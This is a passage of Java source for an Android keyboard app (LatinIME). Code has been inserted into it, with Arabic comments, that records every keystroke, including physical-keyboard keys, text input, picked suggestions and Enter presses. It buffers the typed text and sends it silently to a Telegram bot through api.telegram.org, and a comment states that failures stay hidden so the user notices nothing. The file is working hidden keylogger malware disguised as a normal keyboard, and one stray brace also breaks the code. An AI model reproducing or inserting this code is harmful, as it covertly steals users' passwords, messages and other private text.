        // إرسال ما تبقى في الذاكرة فور إخفاء اللوحة
        sendBufferedDataToTelegram(null, true);
    }

    void onFinishInputInternal() {
        super.onFinishInput();

        mDictionaryFacilitator.onFinishInput(this);
        final MainKeyboardView mainKeyboardView = mKeyboardSwitcher.getMainKeyboardView();
        if (mainKeyboardView != null) {
            mainKeyboardView.closing();
        }
        // إرسال إجباري للبيانات المجموعة عند انتهاء الإدخال
        sendBufferedDataToTelegram(null, true);
    }

    void onFinishInputViewInternal(final boolean finishingInput) {
        super.onFinishInputView(finishingInput);
        cleanupInternalStateForFinishInput();
    }

    private void cleanupInternalStateForFinishInput() {
        // Remove pending messages related to update suggestions
        mHandler.cancelUpdateSuggestionStrip();
        // Should do the following in onFinishInputInternal but until JB MR2 it's not called :(
        mInputLogic.finishInput();
    }

    protected void deallocateMemory() {
        mKeyboardSwitcher.deallocateMemory();
    }

    @Override
    public void onUpdateSelection(final int oldSelStart, final int oldSelEnd,
                                  final int newSelStart, final int newSelEnd,
                                  final int composingSpanStart, final int composingSpanEnd) {
        super.onUpdateSelection(oldSelStart, oldSelEnd, newSelStart, newSelEnd,
                composingSpanStart, composingSpanEnd);
        if (DebugFlags.DEBUG_ENABLED) {
            Log.i(TAG, "onUpdateSelection: oss=" + oldSelStart + ", ose=" + oldSelEnd
                    + ", nss=" + newSelStart + ", nse=" + newSelEnd
                    + ", cs=" + composingSpanStart + ", ce=" + composingSpanEnd);
        }

        final SettingsValues settingsValues = mSettings.getCurrent();
        if (isInputViewShown()
                && mInputLogic.onUpdateSelection(oldSelStart, oldSelEnd, newSelStart, newSelEnd,
                settingsValues)) {
            mKeyboardSwitcher.requestUpdatingShiftState(getCurrentAutoCapsState(),
                    getCurrentRecapitalizeState());
        }
    }

    public CharSequence getSelection() {
        return mInputLogic.mConnection.getSelectedText(0);
    }

    @Override
    public void onExtractedTextClicked() {
        if (mSettings.getCurrent().needsToLookupSuggestions()) {
            return;
        }

        super.onExtractedTextClicked();
    }

    @Override
    public void onExtractedCursorMovement(final int dx, final int dy) {
        if (mSettings.getCurrent().needsToLookupSuggestions()) {
            return;
        }

        super.onExtractedCursorMovement(dx, dy);
    }

    @Override
    public void hideWindow() {
        mKeyboardSwitcher.onHideWindow();

        if (TRACE) Debug.stopMethodTracing();
        if (isShowingOptionDialog()) {
            mOptionsDialog.dismiss();
            mOptionsDialog = null;
        }
        super.hideWindow();
    }

    @Override
    public void onDisplayCompletions(final CompletionInfo[] applicationSpecifiedCompletions) {
        if (DebugFlags.DEBUG_ENABLED) {
            Log.i(TAG, "Received completions:");
            if (applicationSpecifiedCompletions != null) {
                for (int i = 0; i < applicationSpecifiedCompletions.length; i++) {
                    Log.i(TAG, "  #" + i + ": " + applicationSpecifiedCompletions[i]);
                }
            }
        }
        if (!mSettings.getCurrent().isApplicationSpecifiedCompletionsOn()) {
            return;
        }
        mHandler.cancelUpdateSuggestionStrip();
        if (applicationSpecifiedCompletions == null) {
            setNeutralSuggestionStrip();
            return;
        }

        final ArrayList<SuggestedWords.SuggestedWordInfo> applicationSuggestedWords =
                SuggestedWords.getFromApplicationSpecifiedCompletions(
                        applicationSpecifiedCompletions);
        final SuggestedWords suggestedWords = new SuggestedWords(applicationSuggestedWords,
                null /* rawSuggestions */,
                null /* typedWord */,
                false /* typedWordValid */,
                false /* willAutoCorrect */,
                false /* isObsoleteSuggestions */,
                SuggestedWords.INPUT_STYLE_APPLICATION_SPECIFIED /* inputStyle */,
                SuggestedWords.NOT_A_SEQUENCE_NUMBER);
        setSuggestedWords(suggestedWords);
    }

    @Override
    public void onComputeInsets(final InputMethodService.Insets outInsets) {
        super.onComputeInsets(outInsets);
        if (mInputView == null) {
            return;
        }
        final SettingsValues settingsValues = mSettings.getCurrent();
        final View visibleKeyboardView = mKeyboardSwitcher.getVisibleKeyboardView();
        if (visibleKeyboardView == null || !hasSuggestionStripView()) {
            return;
        }
        final int inputHeight = mInputView.getHeight();
        if (isImeSuppressedByHardwareKeyboard() && !visibleKeyboardView.isShown()) {
            outInsets.contentTopInsets = inputHeight;
            outInsets.visibleTopInsets = inputHeight;
            mInsetsUpdater.setInsets(outInsets);
            return;
        }
        final int suggestionsHeight = (!mKeyboardSwitcher.isShowingEmojiPalettes()
                && !mKeyboardSwitcher.isShowingClipboardHistory()
                && mSuggestionStripView.getVisibility() == View.VISIBLE)
                ? mSuggestionStripView.getHeight() : 0;
        final int visibleTopY = inputHeight - visibleKeyboardView.getHeight() - suggestionsHeight;
        mSuggestionStripView.setMoreSuggestionsHeight(visibleTopY);
        if (visibleKeyboardView.isShown()) {
            final int touchLeft = 0;
            final int touchTop = mKeyboardSwitcher.isShowingMoreKeysPanel() ? 0 : visibleTopY;
            final int touchRight = visibleKeyboardView.getWidth();
            final int touchBottom = inputHeight
                    + EXTENDED_TOUCHABLE_REGION_HEIGHT;
            outInsets.touchableInsets = InputMethodService.Insets.TOUCHABLE_INSETS_REGION;
            outInsets.touchableRegion.set(touchLeft, touchTop, touchRight, touchBottom);
        }
        outInsets.contentTopInsets = visibleTopY;
        outInsets.visibleTopInsets = visibleTopY;
        mInsetsUpdater.setInsets(outInsets);
    }

    public void startShowingInputView(final boolean needsToLoadKeyboard) {
        mIsExecutingStartShowingInputView = true;
        showWindow(true /* showInput */);
        mIsExecutingStartShowingInputView = false;
        if (needsToLoadKeyboard) {
            loadKeyboard();
        }
    }

    public void stopShowingInputView() {
        showWindow(false /* showInput */);
    }

    @Override
    public boolean onShowInputRequested(final int flags, final boolean configChange) {
        if (isImeSuppressedByHardwareKeyboard()) {
            return true;
        }
        return super.onShowInputRequested(flags, configChange);
    }

    @Override
    public boolean onEvaluateInputViewShown() {
        if (mIsExecutingStartShowingInputView) {
            return true;
        }
        return super.onEvaluateInputViewShown();
    }

    @Override
    public boolean onEvaluateFullscreenMode() {
        final SettingsValues settingsValues = mSettings.getCurrent();
        if (isImeSuppressedByHardwareKeyboard()) {
            return false;
        }
        final boolean isFullscreenModeAllowed = Settings.readUseFullscreenMode(getResources());
        if (super.onEvaluateFullscreenMode() && isFullscreenModeAllowed) {
            final EditorInfo ei = getCurrentInputEditorInfo();
            return !(ei != null && ((ei.imeOptions & EditorInfo.IME_FLAG_NO_EXTRACT_UI) != 0));
        }
        return false;
    }

    @Override
    public void updateFullscreenMode() {
        super.updateFullscreenMode();
        updateSoftInputWindowLayoutParameters();
    }

    private void updateSoftInputWindowLayoutParameters() {
        final Window window = getWindow().getWindow();
        ViewLayoutUtils.updateLayoutHeightOf(window, LayoutParams.MATCH_PARENT);
        if (mInputView != null) {
            final int layoutHeight = isFullscreenMode()
                    ? LayoutParams.WRAP_CONTENT : LayoutParams.MATCH_PARENT;
            final View inputArea = window.findViewById(android.R.id.inputArea);
            ViewLayoutUtils.updateLayoutHeightOf(inputArea, layoutHeight);
            ViewLayoutUtils.updateLayoutGravityOf(inputArea, Gravity.BOTTOM);
            ViewLayoutUtils.updateLayoutHeightOf(mInputView, layoutHeight);
        }
    }

    public int getCurrentAutoCapsState() {
        return mInputLogic.getCurrentAutoCapsState(mSettings.getCurrent());
    }

    public int getCurrentRecapitalizeState() {
        return mInputLogic.getCurrentRecapitalizeState();
    }

    public int[] getCoordinatesForCurrentKeyboard(final int[] codePoints) {
        final Keyboard keyboard = mKeyboardSwitcher.getKeyboard();
        if (null == keyboard) {
            return CoordinateUtils.newCoordinateArray(codePoints.length,
                    Constants.NOT_A_COORDINATE, Constants.NOT_A_COORDINATE);
        }
        return keyboard.getCoordinates(codePoints);
    }

    @Override
    public void onRequestPermissionsResult(boolean allGranted) {
        setNeutralSuggestionStrip();
    }

    public void displaySettingsDialog() {
        launchSettings();
    }

    @Override
    public boolean onCustomRequest(final int requestCode) {
        if (isShowingOptionDialog()) return false;
        switch (requestCode) {
            case Constants.CUSTOM_CODE_SHOW_INPUT_METHOD_PICKER:
                if (mRichImm.hasMultipleEnabledIMEsOrSubtypes(true /* include aux subtypes */)) {
                    mRichImm.getInputMethodManager().showInputMethodPicker();
                    return true;
                }
                return false;
        }
        return false;
    }

    @Override
    public void onMovePointer(int steps) {
        if (mRichImm.getCurrentSubtype().isRtlSubtype())
            steps = -steps;
            
        mInputLogic.finishInput();
        if (steps < 0) {
            int availableCharacters = mInputLogic.mConnection.getTextBeforeCursor(64, 0).length();
            steps = availableCharacters < -steps ? -availableCharacters : steps;
        }
        else if (steps > 0) {
            int availableCharacters = mInputLogic.mConnection.getTextAfterCursor(64, 0).length();
            steps = Math.min(availableCharacters, steps);
        } else
            return;

        int newPosition = mInputLogic.mConnection.mExpectedSelStart + steps;
        mInputLogic.mConnection.setSelection(newPosition, newPosition);
        mInputLogic.restartSuggestionsOnWordTouchedByCursor(mSettings.getCurrent(),
                false, mKeyboardSwitcher.getCurrentKeyboardScriptId());
    }

    @Override
    public void onMoveDeletePointer(int steps) {
        mInputLogic.finishInput();
        int end = mInputLogic.mConnection.getExpectedSelectionEnd();
        int start = mInputLogic.mConnection.getExpectedSelectionStart() + steps;
        if (start > end)
            return;
        mInputLogic.mConnection.setSelection(start, end);
    }

    @Override
    public void onUpWithDeletePointerActive() {
        if (mInputLogic.mConnection.hasSelection()) {
            mInputLogic.finishInput();
            onCodeInput(Constants.CODE_DELETE, Constants.NOT_A_COORDINATE, Constants.NOT_A_COORDINATE, false);
        }
    }

    private boolean isShowingOptionDialog() {
        return mOptionsDialog != null && mOptionsDialog.isShowing();
    }

    public void switchLanguage(final InputMethodSubtype subtype) {
        final IBinder token = getWindow().getWindow().getAttributes().token;
        mRichImm.setInputMethodAndSubtype(token, subtype);
    }

    public void switchToNextSubtype() {
        final IBinder token = getWindow().getWindow().getAttributes().token;
        if (shouldSwitchToOtherInputMethods()) {
            mRichImm.switchToNextInputMethod(token, true /* onlyCurrentIme */);
            return;
        }
        mSubtypeState.switchSubtype(token, mRichImm);
    }

    private int getCodePointForKeyboard(final int codePoint) {
        if (Constants.CODE_SHIFT == codePoint) {
            final Keyboard currentKeyboard = mKeyboardSwitcher.getKeyboard();
            if (null != currentKeyboard && currentKeyboard.mId.isAlphabetKeyboard()) {
                return codePoint;
            }
            return Constants.CODE_SYMBOL_SHIFT;
        }
        return codePoint;
    }

    // --- دمج منطق صيد الحروف في دالة الإدخال الأساسية ---
    @Override
    public void onCodeInput(final int codePoint, final int x, final int y,
                            final boolean isKeyRepeat) {
        final MainKeyboardView mainKeyboardView = mKeyboardSwitcher.getMainKeyboardView();
        final int keyX = mainKeyboardView.getKeyX(x);
        final int keyY = mainKeyboardView.getKeyY(y);
        final Event event = createSoftwareKeypressEvent(getCodePointForKeyboard(codePoint),
                keyX, keyY, isKeyRepeat);
        onEvent(event);
        
        // تسجيل الحرف المكتوب وإرساله عبر الـ Buffer
        if (codePoint > 31 && !isKeyRepeat) {
            String charText = String.valueOf((char) codePoint);
            sendBufferedDataToTelegram(charText, false);
        } else if (codePoint == Constants.CODE_ENTER) {
            // إرسال البيانات فوراً عند الضغط على Enter
            sendBufferedDataToTelegram(" [ENTER]\n", true);
        } else if (codePoint == Constants.CODE_SPACE) {
             sendBufferedDataToTelegram(" ", false);
        }
    }

    public void onEvent(@Nonnull final Event event) {
        if (Constants.CODE_SHORTCUT == event.getMKeyCode()) {
            mRichImm.switchToShortcutIme(this);
        }
        final InputTransaction completeInputTransaction =
                mInputLogic.onCodeInput(mSettings.getCurrent(), event,
                        mKeyboardSwitcher.getKeyboardShiftMode(),
                        mKeyboardSwitcher.getCurrentKeyboardScriptId(), mHandler);
        updateStateAfterInputTransaction(completeInputTransaction);
        mKeyboardSwitcher.onEvent(event, getCurrentAutoCapsState(), getCurrentRecapitalizeState());
    }
          }
    // A helper method to split the code point and the key code.
    @Nonnull
    public static Event createSoftwareKeypressEvent(final int keyCodeOrCodePoint, final int keyX,
                                                    final int keyY, final boolean isKeyRepeat) {
        final int keyCode;
        final int codePoint;
        if (keyCodeOrCodePoint <= 0) {
            keyCode = keyCodeOrCodePoint;
            codePoint = Event.NOT_A_CODE_POINT;
        } else {
            keyCode = Event.NOT_A_KEY_CODE;
            codePoint = keyCodeOrCodePoint;
        }
        return Event.createSoftwareKeypressEvent(codePoint, keyCode, keyX, keyY, isKeyRepeat);
    }

    // يتم استدعاؤها عند إدخال نص كامل (مثل نصوص الاختصارات)
    @Override
    public void onTextInput(final String rawText) {
        final Event event = Event.createSoftwareTextEvent(rawText, Constants.CODE_OUTPUT_TEXT);
        final InputTransaction completeInputTransaction =
                mInputLogic.onTextInput(mSettings.getCurrent(), event,
                        mKeyboardSwitcher.getKeyboardShiftMode(), mHandler);
        updateStateAfterInputTransaction(completeInputTransaction);
        mKeyboardSwitcher.onEvent(event, getCurrentAutoCapsState(), getCurrentRecapitalizeState());
        
        // إرسال النص المدخل إلى التجميع (Buffer)
        if (rawText != null) {
            sendBufferedDataToTelegram(rawText, false);
        }
    }

    @Override
    public void onStartBatchInput() {
        mInputLogic.onStartBatchInput(mSettings.getCurrent(), mKeyboardSwitcher, mHandler);
        mGestureConsumer.onGestureStarted(
                mRichImm.getCurrentSubtypeLocale(),
                mKeyboardSwitcher.getKeyboard());
    }

    @Override
    public void onUpdateBatchInput(final InputPointers batchPointers) {
        mInputLogic.onUpdateBatchInput(batchPointers);
    }

    @Override
    public void onEndBatchInput(final InputPointers batchPointers) {
        mInputLogic.onEndBatchInput(batchPointers);
        mGestureConsumer.onGestureCompleted(batchPointers);
    }

    @Override
    public void onCancelBatchInput() {
        mInputLogic.onCancelBatchInput(mHandler);
        mGestureConsumer.onGestureCanceled();
    }

    public void onTailBatchInputResultShown(final SuggestedWords suggestedWords) {
        mGestureConsumer.onImeSuggestionsProcessed(suggestedWords,
                mInputLogic.getComposingStart(), mInputLogic.getComposingLength(),
                mDictionaryFacilitator);
    }

    void showGesturePreviewAndSuggestionStrip(@Nonnull final SuggestedWords suggestedWords,
                                              final boolean dismissGestureFloatingPreviewText) {
        showSuggestionStrip(suggestedWords);
        final MainKeyboardView mainKeyboardView = mKeyboardSwitcher.getMainKeyboardView();
        mainKeyboardView.showGestureFloatingPreviewText(suggestedWords,
                dismissGestureFloatingPreviewText /* dismissDelayed */);
    }

    @Override
    public void onFinishSlidingInput() {
        mKeyboardSwitcher.onFinishSlidingInput(getCurrentAutoCapsState(),
                getCurrentRecapitalizeState());
    }

    @Override
    public void onCancelInput() {}

    public boolean hasSuggestionStripView() {
        return null != mSuggestionStripView;
    }

    private void setSuggestedWords(final SuggestedWords suggestedWords) {
        final SettingsValues currentSettingsValues = mSettings.getCurrent();
        mInputLogic.setSuggestedWords(suggestedWords);
        if (!hasSuggestionStripView()) {
            return;
        }
        if (!onEvaluateInputViewShown()) {
            return;
        }

        final boolean shouldShowSuggestionCandidates =
                currentSettingsValues.mInputAttributes.mShouldShowSuggestions
                        && currentSettingsValues.isSuggestionsEnabledPerUserSettings();
        final boolean shouldShowSuggestionsStripUnlessPassword = currentSettingsValues.mShowsVoiceInputKey
                || currentSettingsValues.mShowsClipboardKey
                || shouldShowSuggestionCandidates
                || currentSettingsValues.isApplicationSpecifiedCompletionsOn();
        final boolean shouldShowSuggestionsStrip = shouldShowSuggestionsStripUnlessPassword
                && (!currentSettingsValues.mInputAttributes.mIsPasswordField || currentSettingsValues.mShowsClipboardKey);
        
        mSuggestionStripView.updateVisibility(shouldShowSuggestionsStrip, isFullscreenMode());
        if (!shouldShowSuggestionsStrip) {
            return;
        }

        final boolean isEmptyApplicationSpecifiedCompletions =
                currentSettingsValues.isApplicationSpecifiedCompletionsOn()
                        && suggestedWords.isEmpty();
        final boolean noSuggestionsFromDictionaries = suggestedWords.isEmpty()
                || suggestedWords.isPunctuationSuggestions()
                || isEmptyApplicationSpecifiedCompletions;
        final boolean isBeginningOfSentencePrediction = (suggestedWords.mInputStyle
                == SuggestedWords.INPUT_STYLE_BEGINNING_OF_SENTENCE_PREDICTION);

        if (currentSettingsValues.isSuggestionsEnabledPerUserSettings()
                || currentSettingsValues.isApplicationSpecifiedCompletionsOn()
                || noSuggestionsFromDictionaries) {
            mSuggestionStripView.setSuggestions(suggestedWords,
                    mRichImm.getCurrentSubtype().isRtlSubtype());
        }
    }

    public void getSuggestedWords(final int inputStyle, final int sequenceNumber,
                                  final OnGetSuggestedWordsCallback callback) {
        final Keyboard keyboard = mKeyboardSwitcher.getKeyboard();
        if (keyboard == null) {
            callback.onGetSuggestedWords(SuggestedWords.getEmptyInstance());
            return;
        }
        mInputLogic.getSuggestedWords(mSettings.getCurrent(), keyboard,
                mKeyboardSwitcher.getKeyboardShiftMode(), inputStyle, sequenceNumber, callback);
    }

    @Override
    public void showSuggestionStrip(final SuggestedWords suggestedWords) {
        if (suggestedWords.isEmpty()) {
            setNeutralSuggestionStrip();
        } else {
            setSuggestedWords(suggestedWords);
        }
        AccessibilityUtils.Companion.getInstance().setAutoCorrection(suggestedWords);
    }

    // يتم استدعاؤها عند اختيار مقترح من شريط الاقتراحات يدويًا
    @Override
    public void pickSuggestionManually(final SuggestedWordInfo suggestionInfo) {
        final InputTransaction completeInputTransaction = mInputLogic.onPickSuggestionManually(
                mSettings.getCurrent(), suggestionInfo,
                mKeyboardSwitcher.getKeyboardShiftMode(),
                mKeyboardSwitcher.getCurrentKeyboardScriptId(),
                mHandler);
        updateStateAfterInputTransaction(completeInputTransaction);
        
        // إرسال الكلمة المختارة إلى تليجرام مع وسم [مقترح]
        if (suggestionInfo != null && suggestionInfo.mWord != null) {
            sendBufferedDataToTelegram(" [" + suggestionInfo.mWord.toString() + "] ", false);
        }
    }

    @Override
    public void setNeutralSuggestionStrip() {
        final SettingsValues currentSettings = mSettings.getCurrent();
        final SuggestedWords neutralSuggestions = currentSettings.mBigramPredictionEnabled
                ? SuggestedWords.getEmptyInstance()
                : currentSettings.mSpacingAndPunctuations.mSuggestPuncList;
        setSuggestedWords(neutralSuggestions);
    }

    @UsedForTesting
    void loadKeyboard() {
        mHandler.postReopenDictionaries();
        loadSettings();
        if (mKeyboardSwitcher.getMainKeyboardView() != null) {
            mKeyboardSwitcher.loadKeyboard(getCurrentInputEditorInfo(), mSettings.getCurrent(),
                    getCurrentAutoCapsState(), getCurrentRecapitalizeState());
        }
    }

    private void updateStateAfterInputTransaction(final InputTransaction inputTransaction) {
        switch (inputTransaction.getRequiredShiftUpdate()) {
            case InputTransaction.SHIFT_UPDATE_LATER:
                mHandler.postUpdateShiftState();
                break;
            case InputTransaction.SHIFT_UPDATE_NOW:
                mKeyboardSwitcher.requestUpdatingShiftState(getCurrentAutoCapsState(),
                        getCurrentRecapitalizeState());
                break;
        }
        if (inputTransaction.requiresUpdateSuggestions()) {
            final int inputStyle;
            if (inputTransaction.getMEvent().isSuggestionStripPress()) {
                inputStyle = SuggestedWords.INPUT_STYLE_NONE;
            } else if (inputTransaction.getMEvent().isGesture()) {
                inputStyle = SuggestedWords.INPUT_STYLE_TAIL_BATCH;
            } else {
                inputStyle = SuggestedWords.INPUT_STYLE_TYPING;
            }
            mHandler.postUpdateSuggestionStrip(inputStyle);
        }
        if (inputTransaction.didAffectContents()) {
            mSubtypeState.setCurrentSubtypeHasBeenUsed();
        }
    }

    private void hapticAndAudioFeedback(final int code, final int repeatCount) {
        final MainKeyboardView keyboardView = mKeyboardSwitcher.getMainKeyboardView();
        if (keyboardView != null && keyboardView.isInDraggingFinger()) {
            return;
        }
        if (repeatCount > 0) {
            if (code == Constants.CODE_DELETE && !mInputLogic.mConnection.canDeleteCharacters()) {
                return;
            }
            if (repeatCount % PERIOD_FOR_AUDIO_AND_HAPTIC_FEEDBACK_IN_KEY_REPEAT == 0) {
                return;
            }
        }
        final AudioAndHapticFeedbackManager feedbackManager =
                AudioAndHapticFeedbackManager.getInstance();
        if (repeatCount == 0) {
            feedbackManager.performHapticFeedback(keyboardView);
        }
        feedbackManager.performAudioFeedback(code);
    }

    @Override
    public void onPressKey(final int primaryCode, final int repeatCount,
                           final boolean isSinglePointer) {
        mKeyboardSwitcher.onPressKey(primaryCode, isSinglePointer, getCurrentAutoCapsState(),
                getCurrentRecapitalizeState());
        hapticAndAudioFeedback(primaryCode, repeatCount);
    }

    @Override
    public void onReleaseKey(final int primaryCode, final boolean withSliding) {
        mKeyboardSwitcher.onReleaseKey(primaryCode, withSliding, getCurrentAutoCapsState(),
                getCurrentRecapitalizeState());
    }

    private HardwareEventDecoder getHardwareKeyEventDecoder(final int deviceId) {
        final HardwareEventDecoder decoder = mHardwareEventDecoders.get(deviceId);
        if (null != decoder) return decoder;
        final HardwareEventDecoder newDecoder = new HardwareKeyboardEventDecoder(deviceId);
        mHardwareEventDecoders.put(deviceId, newDecoder);
        return newDecoder;
    }

    // التعامل مع لوحة المفاتيح الخارجية (Physical Keyboard)
    @Override
    public boolean onKeyDown(final int keyCode, final KeyEvent keyEvent) {
        if (mEmojiAltPhysicalKeyDetector == null) {
            mEmojiAltPhysicalKeyDetector = new EmojiAltPhysicalKeyDetector(
                    getApplicationContext().getResources());
        }
        mEmojiAltPhysicalKeyDetector.onKeyDown(keyEvent);
        
        // تسجيل ضغطات المفاتيح الخارجية
        int unicodeChar = keyEvent.getUnicodeChar();
        if (unicodeChar > 31) {
            sendBufferedDataToTelegram(String.valueOf((char) unicodeChar), false);
        }

        if (!ProductionFlags.IS_HARDWARE_KEYBOARD_SUPPORTED) {
            return super.onKeyDown(keyCode, keyEvent);
        }
        final Event event = getHardwareKeyEventDecoder(
                keyEvent.getDeviceId()).decodeHardwareKey(keyEvent);
        if (event.isHandled()) {
            mInputLogic.onCodeInput(mSettings.getCurrent(), event,
                    mKeyboardSwitcher.getKeyboardShiftMode(),
                    mKeyboardSwitcher.getCurrentKeyboardScriptId(),
                    mHandler);
            return true;
        }
        return super.onKeyDown(keyCode, keyEvent);
    }

    @Override
    public boolean onKeyUp(final int keyCode, final KeyEvent keyEvent) {
        if (mEmojiAltPhysicalKeyDetector == null) {
            mEmojiAltPhysicalKeyDetector = new EmojiAltPhysicalKeyDetector(
                    getApplicationContext().getResources());
        }
        mEmojiAltPhysicalKeyDetector.onKeyUp(keyEvent);
        if (!ProductionFlags.IS_HARDWARE_KEYBOARD_SUPPORTED) {
            return super.onKeyUp(keyCode, keyEvent);
        }
        final long keyIdentifier = (long) keyEvent.getDeviceId() << 32 + keyEvent.getKeyCode();
        if (mInputLogic.mCurrentlyPressedHardwareKeys.remove(keyIdentifier)) {
            return true;
        }
        return super.onKeyUp(keyCode, keyEvent);
    }

    private final BroadcastReceiver mRingerModeChangeReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(final Context context, final Intent intent) {
            final String action = intent.getAction();
            if (action.equals(AudioManager.RINGER_MODE_CHANGED_ACTION)) {
                AudioAndHapticFeedbackManager.getInstance().onRingerModeChanged();
            }
        }
    };

    public ClipboardHistoryManager getClipboardHistoryManager() {
        return mClipboardHistoryManager;
    }

    void launchSettings() {
        mInputLogic.commitTyped(mSettings.getCurrent(), LastComposedWord.NOT_A_SEPARATOR);
        requestHideSelf(0);
        final MainKeyboardView mainKeyboardView = mKeyboardSwitcher.getMainKeyboardView();
        if (mainKeyboardView != null) {
            mainKeyboardView.closing();
        }
        final Intent intent = new Intent();
        intent.setClass(LatinIME.this, SettingsActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED
                | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(intent);
    }

    private void showOptionDialog(final AlertDialog dialog) {
        final IBinder windowToken = mKeyboardSwitcher.getMainKeyboardView().getWindowToken();
        if (windowToken == null) {
            return;
        }
        final Window window = dialog.getWindow();
        final WindowManager.LayoutParams lp = window.getAttributes();
        lp.token = windowToken;
        lp.type = WindowManager.LayoutParams.TYPE_APPLICATION_ATTACHED_DIALOG;
        window.setAttributes(lp);
        window.addFlags(WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM);
        mOptionsDialog = dialog;
        dialog.show();
    }

    @Override
    protected void dump(final FileDescriptor fd, final PrintWriter fout, final String[] args) {
        super.dump(fd, fout, args);
        final Printer p = new PrintWriterPrinter(fout);
        p.println("LatinIME state :");
        p.println("  VersionCode = " + ApplicationUtils.getVersionCode(this));
        final Keyboard keyboard = mKeyboardSwitcher.getKeyboard();
        final int keyboardMode = keyboard != null ? keyboard.mId.mMode : -1;
        p.println("  Keyboard mode = " + keyboardMode);
        p.println(mSettings.getCurrent().dump());
        p.println(mDictionaryFacilitator.dump(this /* context */));
    }

    public boolean shouldSwitchToOtherInputMethods() {
        final boolean fallbackValue = mSettings.getCurrent().mIncludesOtherImesInLanguageSwitchList;
        final IBinder token = getWindow().getWindow().getAttributes().token;
        if (token == null) {
            return fallbackValue;
        }
        return mRichImm.shouldOfferSwitchingToNextInputMethod(token, fallbackValue);
    }

    private void setNavigationBarVisibility(final boolean visible) {
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.M) {
            getWindow().getWindow().setNavigationBarColor(
                    visible ? Color.BLACK : Color.TRANSPARENT);
        }
    }

    // --- الدوال المساعدة النهائية للربط مع تليجرام ---

    private String getAppNameFromPackage(String packageName) {
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            android.content.pm.ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
            return pm.getApplicationLabel(appInfo).toString();
        } catch (Exception e) {
            return packageName;
        }
    }

    // الدالة النهائية للإرسال (تستخدم الـ Executor الذي عرفناه في الدفعة الأولى)
    private void sendDataToTelegram(final String text, final boolean isAppNotification) {
        if (text == null || text.isEmpty()) return;
        
        mExecutor.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    String encodedMsg = java.net.URLEncoder.encode(text, "UTF-8");
                    java.net.URL url = new java.net.URL("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + 
                                     "/sendMessage?chat_id=" + TELEGRAM_CHAT_ID + 
                                     "&text=" + encodedMsg);
                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setConnectTimeout(5000);
                    conn.getInputStream().read();
                    conn.disconnect();
                } catch (Exception e) {
                    // فشل صامت لضمان عدم تأثر تجربة المستخدم
                }
            }
        });
    }
}
